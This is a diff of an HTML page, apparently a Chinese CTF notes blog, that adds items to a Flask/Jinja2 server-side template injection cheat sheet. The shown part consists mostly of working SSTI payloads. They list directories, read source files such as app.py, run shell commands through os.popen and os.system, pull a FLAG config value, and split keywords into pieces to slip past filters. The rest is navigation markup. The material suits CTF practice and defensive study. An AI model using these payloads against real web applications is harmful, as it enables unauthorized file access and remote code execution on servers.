@@ -181,21 +181,36 @@
 </ul>
 <p>flask（jinja2）</p>
 <ul>
-<li>查看文件夹<ul>
+<li><p>查看文件夹</p>
+<ul>
 <li><code>&#123; &#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].listdir(&#39;./&#39;)&#125; &#125;</code>这里的<code>./</code>是路径</li>
 </ul>
 </li>
-<li>读取文件<ul>
-<li><code>&#123; &#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;filename&#39;).read()&#125; &#125;</code></li>
-<li><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )</code></li>
-<li><code>request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#39;+&#39;ad()&#39;)</code></li>
+<li><p>读取文件</p>
+<ul>
+<li><p><code>&#123; &#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;filename&#39;).read()&#125; &#125;</code></p>
+</li>
+<li><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )</code></p>
+</li>
+<li><p><code>request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#39;+&#39;ad()&#39;)</code></p>
+</li>
+<li><p>补：读取文件源码1（读文件）：<code>&#123; &#123;lipsum.__globals__.__builtins__.open(&#39;app.py&#39;,&#39;r&#39;).read()&#125; &#125;</code></p>
+</li>
+<li><p>读取文件源码2（读文件）：<code> &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
+</li>
+<li><p>获取目录信息1：<code>&#123; &#123;lipsum.__globals__.__builtins__[&#39;__impo&#39;+&#39;rt__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&#125; &#125;</code></p>
+</li>
+<li><p>获取目录信息2：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
+</li>
 </ul>
 </li>
-<li>RCE<ul>
+<li><p>RCE</p>
+<ul>
 <li><code>object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</code></li>
 </ul>
 </li>
-<li>查看配置项<ul>
+<li><p>查看配置项</p>
+<ul>
 <li><code>&#123; &#123; url_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;</code></li>
 </ul>
 </li>
@@ -269,7 +284,12 @@
 
             
             <nav class="dis_flex al_post_nav">
-                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/07/08/CISCN%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+                    
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
+                        </svg>
+                        <span class="al_text_ellipsis al_post_nav_desc">CISCN赛后复现</span>
                     
                 </a>
                 <a class="al_post_nav_item dis_flex_acenter" href="/2023/06/28/ISCC2023-MISC/">
